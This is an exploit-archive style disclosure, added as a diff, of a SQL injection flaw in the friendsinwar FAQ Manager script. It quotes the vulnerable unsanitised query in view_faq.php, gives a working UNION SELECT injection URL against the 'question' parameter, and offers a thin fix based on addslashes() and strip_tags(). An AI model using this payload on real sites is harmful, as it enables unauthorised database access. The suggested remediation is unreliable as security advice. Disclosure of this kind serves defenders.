@@ -1,0 +1,27 @@
+# Exploit Title: friendsinwar FAQ Manager SQL Injection (URL) Vulnerability
+# Date: 16.11 2012
+# Exploit Author: unsuprise
+# Vendor Homepage: http://www.friendsinwar.com
+# Software Link:http://www.friendsinwar.com/script_demo/the_faq_manager/
+# Tested on: Windows 7, Xampp
+# Blog : unsuprise.org
+
+Bug :
+view_faq.php
+
+line 3
+$question = $_GET['question'];
+
+line 5
+$result = mysql_query("SELECT * FROM ".$prefix."faqs WHERE id = ".$question." ORDER BY id");
+
+SQL Injection :
+http://localhost/[path]/view_faq.php?question=-4+AND+1=2+UNION+SELECT+0,1,2,version%28%29,4,5--
+
+Solving:
+Validate $question (used addslashes() , strip_tags(), or your optimization code)
+Validate $result , if data still exist or not..
+
+
+Thanks to :
+d3b4g,All indonesia Security.
